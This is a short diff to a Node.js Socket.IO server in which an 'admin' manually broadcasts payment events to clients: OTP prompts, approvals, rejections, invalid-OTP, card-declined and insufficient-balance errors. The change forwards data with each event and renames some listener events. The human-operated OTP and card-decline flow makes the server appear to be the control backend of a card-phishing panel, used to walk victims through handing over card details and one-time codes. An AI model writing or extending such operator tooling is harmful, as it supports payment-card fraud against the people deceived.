@@ -86,33 +86,33 @@ io.on('connection', (socket) => {
   // Handle admin actions
   socket.on('show-otp', (data) => {
     console.log('Admin requested OTP:', data);
-    socket.broadcast.emit('show-otp');
+    socket.broadcast.emit('show-otp', data);
   });
 
   socket.on('approve-payment', (data) => {
     console.log('Admin approved payment:', data);
-    socket.broadcast.emit('payment-approved');
+    socket.broadcast.emit('payment-approved', data);
   });
 
   socket.on('reject-payment', (data) => {
     console.log('Admin rejected payment:', data);
-    socket.broadcast.emit('payment-rejected', data.reason);
+    socket.broadcast.emit('payment-rejected', data);
   });
 
   // New admin actions for enhanced OTP flow
-  socket.on('invalid-otp', () => {
-    console.log('Admin marked OTP as invalid');
-    socket.broadcast.emit('invalid-otp-error');
+  socket.on('invalid-otp-error', (data) => {
+    console.log('Admin marked OTP as invalid', data);
+    socket.broadcast.emit('invalid-otp-error', data);
   });
 
-  socket.on('card-declined', () => {
-    console.log('Admin declined card');
-    socket.broadcast.emit('card-declined-error');
+  socket.on('card-declined-error', (data) => {
+    console.log('Admin declined card', data);
+    socket.broadcast.emit('card-declined-error', data);
   });
 
-  socket.on('insufficient-balance', () => {
-    console.log('Admin marked insufficient balance');
-    socket.broadcast.emit('insufficient-balance-error');
+  socket.on('insufficient-balance-error', (data) => {
+    console.log('Admin marked insufficient balance', data);
+    socket.broadcast.emit('insufficient-balance-error', data);
   });
 
   // Handle OTP submission
